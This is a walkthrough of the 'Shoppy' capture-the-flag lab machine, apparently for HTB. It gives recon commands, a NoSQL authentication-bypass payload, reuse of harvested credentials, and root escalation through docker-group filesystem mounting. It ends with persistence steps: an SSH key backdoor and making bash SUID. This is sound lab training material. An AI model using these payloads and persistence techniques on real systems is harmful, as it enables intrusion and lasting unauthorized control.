## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
## 🔍 Recon

### Nmap Scan
```bash
nmap -p- --min-rate 10000 10.10.11.180
nmap -p 22,80,9093 -sCV 10.10.11.180
```

### Hosts File
```bash
echo "10.10.11.180 shoppy.htb mattermost.shoppy.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing
```bash
wfuzz -u http://10.10.11.180 -H "Host: FUZZ.shoppy.htb" \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 169
```

### [Feroxbuster](HTTP)
```bash
feroxbuster -u http://shoppy.htb
```

---

## 🔑 NoSQL Auth Bypass

### Target: `/login`
**Bypass Payload (URL-Encoded or Raw)**:
```bash
username=admin'||'a'=='a&password=admin
```

**Headers**:
```http
Content-Type: application/x-www-form-urlencoded
```

### Dump Users via Injection:
```bash
username=admin' || 1==1 //&password=123
```

### Decode MD5 Hash on [CrackStation](https://crackstation.net)

---

## 💬 Mattermost Access

### Use Found Creds
- **User**: josh
- **Pass**: `remembermethisway`

### Locate SSH Creds for `jaeger` in "Deploy Machine" Channel:
- `user: jaeger`
- `pass: Sh0ppyBest@pp!`

---

## 🔐 [SSH](SSH) Access

```bash
sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@shoppy.htb
```

---

## 🧑‍💼 PrivEsc to Deploy

### Sudo Check
```bash
sudo -l
```

### Path Found
```bash
sudo -u deploy /home/deploy/password-manager
```

### Reverse Engineering

**Pull Binary:**
```bash
scp jaeger@shoppy.htb:/home/deploy/password-manager .
```

**Extract Password:**
Use Ghidra OR:
```bash
strings -el password-manager
```

**Result**:
```text
Password: Sample
```

**Use it:**
```bash
sudo -u deploy /home/deploy/password-manager
# --> Deploying@pp!
```

**Switch User:**
```bash
su deploy
```

---

## 🐳 Root via Docker Group

### Confirm Docker Access
```bash
id
docker images
```

### Method 1: Mount Host Filesystem (Basic)
```bash
docker run --rm -it -v /:/mnt alpine /bin/sh
```

### Method 2: chroot Escape to Host (Recommended)
```bash
docker run --rm -it -v /:/mnt alpine chroot /mnt sh
```

### Get Flag
```bash
cat /root/root.txt
```

---

## 🪝 Optional Root Persistence

### SSH Access via Public Key (From Container)
```bash
mkdir /root/.ssh
echo "ssh-ed25519 AAAA...user@host" > /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
```

### Or Make Bash SUID
```bash
chmod 4777 /bin/bash
bash -p
```

---

## 🔬 Beyond Root: NoSQL Injection Logic

### Original Code Equivalent:
```js
this.username == 'admin' || 'a'=='a' && this.password == 'pass'
```

### Precedence Breakdown:
```text
true || (true && false) => true
```